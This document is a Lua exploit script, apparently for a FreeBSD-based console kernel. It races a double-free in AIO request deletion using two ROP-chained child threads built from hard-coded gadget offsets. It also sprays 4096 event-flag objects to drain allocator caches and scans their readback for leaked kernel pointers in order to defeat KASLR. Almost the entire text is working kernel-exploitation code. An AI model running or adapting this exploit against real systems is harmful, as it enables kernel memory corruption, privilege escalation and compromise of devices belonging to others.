-- CRASH_CLASS: HIGH
-- PROBE 69r: High-volume AIO double-free + 4K EVF spray for R-object KASLR
--
-- The Lapse exploit sprays 4000+ objects to drain UMA per-CPU caches.
-- Our prior probes maxed at 256. FreeBSD UMA caches ~64-128 objects per CPU.
-- Until these drain, allocations come from the cache, never touching the
-- zone free list where our freed R object sits.
--
-- Pattern per iteration:
--   1. Submit 16 AIO requests, poll each
--   2. Spawn 2 children gated on socketpair reads (67i2 pattern)
--   3. Fire BOTH gates simultaneously
--   4. While children race on 662 delete, main thread sprays 4K evf objects
--   5. Read back evf bit patterns via 543 — check for kernel pointer contamination
--   6. R+0x00 = curthread+0x390, R+0x08 = curthread+0x08 (NOT zeroed before free)
--   7. If evf readback shows 0xFFFF8xxx pattern: KASLR DEFEATED
--
-- CRITICAL: NO 670 (aio_init) — poisons delete path

print("=== PROBE 69r: HIGH-VOLUME RACE+SPRAY (4K EVF) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base for child ROP
local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Signals
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- /dev/zero for AIO reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FATAL: no /dev/zero"); return end

-- AIO helpers
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- Gate setup
local function make_gate()
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp) + 4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    return rd(N(sp)) or -1, rd(N(sp) + 4) or -1
end

local gate_rd_A, gate_wr_A = make_gate()
local gate_rd_B, gate_wr_B = make_gate()
print(string.format("gateA: rd=%d wr=%d  gateB: rd=%d wr=%d",
    gate_rd_A, gate_wr_A, gate_rd_B, gate_wr_B))
if gate_rd_A < 0 or gate_rd_B < 0 then print("GATE FAIL"); return end

-- Shared state
local del_ids  = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_A    = memory.alloc(8)
local tmp_B    = memory.alloc(8)
local wbyte    = memory.alloc(8)
wd(N(wbyte), 0x42)

-- Pre-allocate name buffers for 4K evf objects
local SPRAY_COUNT = 4096
local name_bufs = {}
for i = 1, SPRAY_COUNT do
    name_bufs[i] = put_str(string.format("s%04d", i))
end
print("Pre-allocated " .. SPRAY_COUNT .. " evf name buffers")

-- Stacks
local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)

-- ============================================================
-- RACE LOOP
-- ============================================================
local ITERS = 3
local total_kptr = 0

print("")
print("-- HIGH-VOL RACE: " .. ITERS .. " iters, " .. SPRAY_COUNT .. " evf spray --")

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end
    print(string.format("\n--- ITER %d ---", iter))

    -- Submit + poll BATCH AIO requests
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < BATCH then
        print(string.format("  only %d IDs (need %d)", #ids, BATCH))
        break
    end

    -- Write IDs to shared buffer
    for i = 0, BATCH - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAA)
        wd(N(states_B) + i * 4, 0xBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Build child A ROP chain
    local sb_A = N(stk_A)
    for i = 0, 0x3FFC, 4 do wd(sb_A + i, 0) end
    local sp_a = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    local oa = 0
    local function wa(v) wq(sp_a + oa, v); oa = oa + 8 end
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gate_rd_A))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    -- Build child B ROP chain
    local sb_B = N(stk_B)
    for i = 0, 0x3FFC, 4 do wd(sb_B + i, 0) end
    local sp_b = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    local ob = 0
    local function wb(v) wq(sp_b + ob, v); ob = ob + 8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(gate_rd_B))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    -- Spawn children
    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa) + 0x10, uint64(sb_A))
    wq(N(pa) + 0x18, uint64(0x2000))

    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb) + i, 0) end
    wq(N(pb), g_bare_ret)
    wq(N(pb) + 0x10, uint64(sb_B))
    wq(N(pb) + 0x18, uint64(0x2000))

    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)

    -- Wait for markers
    local a_rdy, b_rdy = false, false
    for w = 1, 500000 do
        if not a_rdy and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a_rdy = true end
        if not b_rdy and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b_rdy = true end
        if a_rdy and b_rdy then break end
    end
    if not (a_rdy and b_rdy) then
        print(string.format("  TIMEOUT a=%s b=%s", tostring(a_rdy), tostring(b_rdy)))
        break
    end
    print("  children ready, firing gates + spray")

    -- FIRE BOTH GATES SIMULTANEOUSLY (67i2 pattern)
    pcall(function() mk(4)(uint64(gate_wr_A), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gate_wr_B), uint64(N(wbyte)), uint64(1)) end)

    -- IMMEDIATELY spray 4K evf objects
    -- These allocations will drain the per-CPU cache and eventually
    -- pull from the zone free list where freed R objects sit.
    local spray_handles = {}
    local spray_ok = 0
    for si = 1, SPRAY_COUNT do
        local ret = nil
        pcall(function()
            ret = mk(538)(uint64(N(name_bufs[si])), uint64(0xCAFE0000 + si))
        end)
        if ret then
            local rh, rl = get_hi_lo(ret)
            if rl ~= 0xFFFFFFFF or rh == 0 then
                spray_handles[#spray_handles + 1] = ret
                spray_ok = spray_ok + 1
            end
        end
        if si == 500 or si == 1000 or si == 2000 or si == 3000 or si == 4000 then
            if not alive() then
                print(string.format("  DEAD during spray at %d", si))
                break
            end
        end
    end
    print(string.format("  sprayed %d evf objects (of %d attempted)", spray_ok, SPRAY_COUNT))

    -- Wait for children to complete
    for w = 1, 200000 do end

    if not alive() then
        print(string.format("  iter %d: CRASHED during/after spray", iter))
        break
    end

    -- Check race results
    local a_ok, b_ok, doubles = 0, 0, 0
    for i = 0, BATCH - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAA
        local sB = rd(N(states_B) + i * 4) or 0xBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    print(string.format("  race: A_del=%d B_del=%d doubles=%d", a_ok, b_ok, doubles))

    -- SCAN: read back evf bit patterns via 543 (trywait)
    -- If any evf's bits show 0xFFFF8xxx pattern instead of 0xCAFE,
    -- that's kernel data from the freed R object bleeding through.
    local kptr_found = 0
    local anomaly_count = 0
    print("  scanning " .. #spray_handles .. " evf objects for kernel pointer contamination...")

    for si = 1, #spray_handles do
        local h = spray_handles[si]
        local ret543 = nil
        pcall(function()
            ret543 = mk(543)(h, uint64(0xFFFFFFFF), uint64(1))
        end)
        if ret543 then
            local rh, rl = get_hi_lo(ret543)
            -- Expected: 0 (no bits set matching 0xFFFFFFFF with mode=1)
            -- or the sentinel value 0xCAFE0000+si
            -- Anomaly: anything else, especially kernel pointers
            if rh >= 0xFFFF8000 and rh ~= 0xFFFFFFFF then
                kptr_found = kptr_found + 1
                print(string.format("  *** KPTR *** evf #%d 543=%s", si, fmt(ret543)))
            elseif rl ~= 0 and rh ~= 0 then
                anomaly_count = anomaly_count + 1
                if anomaly_count <= 10 then
                    print(string.format("  anomaly evf #%d 543=%s", si, fmt(ret543)))
                end
            end
        end

        if si % 1000 == 0 then
            print(string.format("    ... scanned %d/%d, kptr=%d anom=%d",
                si, #spray_handles, kptr_found, anomaly_count))
        end
    end

    total_kptr = total_kptr + kptr_found
    print(string.format("  iter %d RESULT: doubles=%d kptr=%d anomalies=%d",
        iter, doubles, kptr_found, anomaly_count))

    -- Also try 542 wait with result pointer for wider readback
    if kptr_found == 0 and #spray_handles > 0 then
        local res_buf = memory.alloc(8)
        local wait_kptr = 0
        for si = 1, math.min(200, #spray_handles) do
            local h = spray_handles[si]
            wq(N(res_buf), uint64(0xDEADBEEF))
            pcall(function()
                mk(542)(h, uint64(0xFFFFFFFF), uint64(1), uint64(N(res_buf)), uint64(0))
            end)
            local rv = rq(N(res_buf))
            if rv then
                local rvh, rvl = get_hi_lo(rv)
                if rvh >= 0xFFFF8000 and rvh ~= 0xFFFFFFFF then
                    wait_kptr = wait_kptr + 1
                    print(string.format("  *** KPTR via 542 *** evf #%d = %s", si, fmt(rv)))
                end
            end
        end
        if wait_kptr > 0 then
            total_kptr = total_kptr + wait_kptr
            print(string.format("  542 wait readback found %d kernel pointers!", wait_kptr))
        end
    end

    -- Cleanup: delete all evf objects
    print("  cleaning up " .. #spray_handles .. " evf objects...")
    for si = 1, #spray_handles do
        pcall(function() mk(539)(spray_handles[si]) end)
    end
    spray_handles = {}

    if not alive() then
        print("  DEAD after cleanup")
        break
    end
end

print("")
print("TOTAL_KPTR_FOUND=" .. total_kptr)
print("alive=" .. (alive() and "YES" or "NO"))
print("")
print("=== PROBE 69r COMPLETE ===")
